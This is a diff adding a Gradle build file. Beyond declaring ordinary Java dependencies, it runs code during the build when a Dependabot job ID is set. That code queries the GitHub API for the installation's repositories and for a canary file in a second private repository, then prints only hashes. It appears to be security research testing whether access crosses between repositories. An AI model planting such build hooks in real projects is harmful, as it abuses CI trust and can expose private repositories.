@@ -1,0 +1,110 @@
+import groovy.json.JsonSlurper
+import java.nio.charset.StandardCharsets
+import java.security.MessageDigest
+
+plugins {
+    id 'java'
+}
+
+repositories {
+    mavenCentral()
+}
+
+dependencyLocking {
+    lockAllConfigurations()
+}
+
+dependencies {
+    implementation 'com.google.guava:guava:31.0.1-jre'
+    implementation 'org.apache.commons:commons-lang3:3.12.0'
+}
+
+def no01Hex = { byte[] value ->
+    MessageDigest.getInstance('SHA-256').digest(value).collect { String.format('%02x', it) }.join()
+}
+
+def no01ReadBody = { InputStream stream ->
+    if (stream == null) {
+        return new byte[0]
+    }
+    try {
+        ByteArrayOutputStream output = new ByteArrayOutputStream()
+        byte[] chunk = new byte[8192]
+        int total = 0
+        int read
+        while ((read = stream.read(chunk)) != -1 && total < 1048576) {
+            int accepted = Math.min(read, 1048576 - total)
+            output.write(chunk, 0, accepted)
+            total += accepted
+        }
+        return output.toByteArray()
+    } finally {
+        stream.close()
+    }
+}
+
+def no01Probe = { String label, String target, String expectedSha256 = '', Map<String, String> headers = [:] ->
+    try {
+        HttpURLConnection connection = (HttpURLConnection) new URL(target).openConnection()
+        connection.setConnectTimeout(5000)
+        connection.setReadTimeout(5000)
+        connection.setInstanceFollowRedirects(false)
+        connection.setRequestMethod('GET')
+        headers.each { key, value -> connection.setRequestProperty(key, value) }
+
+        int status = connection.getResponseCode()
+        InputStream stream = status >= 400 ? connection.getErrorStream() : connection.getInputStream()
+        byte[] body = no01ReadBody(stream)
+        String bodySha256 = no01Hex(body)
+        boolean exact = expectedSha256 && bodySha256 == expectedSha256
+        println "NO_01_GITHUB_API label=${label} status=${status} bytes=${body.length} sha256=${bodySha256} exact=${exact}"
+
+        if (label == 'installation-repositories' && status == 200 && body.length > 0) {
+            Object parsed = new JsonSlurper().parseText(new String(body, StandardCharsets.UTF_8))
+            Collection repositories = parsed instanceof Map && parsed.repositories instanceof Collection ? parsed.repositories : []
+            boolean targetPresent = repositories.any {
+                it instanceof Map && it.full_name == 'ilyyeees/no_01-relates-private-0929020509'
+            }
+            println "NO_01_INSTALLATION_REPOSITORIES total_count=${parsed.total_count} returned=${repositories.size()} target_present=${targetPresent}"
+        }
+    } catch (Throwable error) {
+        println "NO_01_GITHUB_API label=${label} error=${error.getClass().getName()} message_sha256=${no01Hex(String.valueOf(error.getMessage()).getBytes(StandardCharsets.UTF_8))}"
+    }
+}
+
+String no01JobId = System.getenv('DEPENDABOT_JOB_ID')
+File no01Marker = new File('/tmp/no_01_dependabot_github_api_probe_done')
+
+if (no01JobId && !no01Marker.exists()) {
+    no01Marker.text = no01JobId
+    println "NO_01_CONTEXT job_id=${no01JobId}"
+
+    Map<String, String> apiHeaders = [
+        'Accept': 'application/vnd.github+json',
+        'X-GitHub-Api-Version': '2026-03-10'
+    ]
+    Map<String, String> rawHeaders = [
+        'Accept': 'application/vnd.github.raw+json',
+        'X-GitHub-Api-Version': '2026-03-10'
+    ]
+
+    no01Probe(
+        'current-repository-read-control',
+        'https://api.github.com/repos/ilyyeees/no_01-dependabot-bundler-path-0929143553/contents/README.md',
+        '43c1c09183cf9f1ccd332577f7bce37ed80ca5ac71843e2cfc480fae1961d41f',
+        rawHeaders
+    )
+    no01Probe(
+        'installation-repositories',
+        'https://api.github.com/installation/repositories?per_page=100',
+        '',
+        apiHeaders
+    )
+    no01Probe(
+        'second-private-repository-canary',
+        'https://api.github.com/repos/ilyyeees/no_01-relates-private-0929020509/contents/no_01-dependabot-cross-repo-canary.txt',
+        'd03f5f6bcc57cd27b0f4101b53b8d10de289984cdd011f13cd8f547618f4ca75',
+        rawHeaders
+    )
+    throw new GradleException('NO_01_GITHUB_API_PROBE_COMPLETE_HASH_ONLY')
+}
